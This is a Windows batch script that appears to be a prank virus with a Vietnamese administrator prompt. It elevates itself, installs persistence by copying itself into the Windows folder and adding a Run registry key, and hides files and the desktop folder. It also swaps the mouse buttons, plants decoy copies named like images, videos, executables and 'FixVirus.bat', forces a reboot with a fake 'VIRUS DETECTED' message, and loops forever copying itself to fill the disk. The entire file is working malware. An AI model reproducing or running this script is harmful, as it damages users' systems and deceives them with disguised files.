@Echo off

:: ==== CHECK ADMIN ====
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Yêu cầu quyền Administrator...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

color 4
title 4
title R.I.P
start
start
start
start calc
start notepad 
start mspaint 
start powershell
copy %0 %Systemroot%\Greatgame.bat > nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Greatgame /t REG_SZ /d "%SystemRoot%\Greatgame.bat" /f
copy %0 *.bat > nul
Attrib +r +h %Systemroot%\Greatgame.bat
Attrib +r +h %userprofile%\desktop
RUNDLL32 USER32.DLL,SwapMouseButton
start calc
cls
start
cls
cd %userprofile%\desktop
copy Greatgame.bat R.I.P.bat
copy Greatgame.bat R.I.P.jpg
copy Greatgame.bat R.I.P.txt
copy Greatgame.bat R.I.P.exe
copy Greatgame.bat R.I.P.mov
copy Greatgame.bat FixVirus.bat
cd %userprofile%My Documents
copy Greatgame.bat R.I.P.bat
copy Greatgame.bat R.I.P.jpg
copy Greatgame.bat R.I.P.txt
copy Greatgame.bat R.I.P.exe
copy Greatgame.bat R.I.P.mov
copy Greatgame.bat FixVirus.bat
start
start calc
cls
msg * R.I.P
msg * R.I.P
shutdown -r -t 10 -c "VIRUS DETECTED"
start
start
:R.I.P
cd %usernameprofile%\desktop
copy Greatgame.bat %random%.bat
goto R.I.P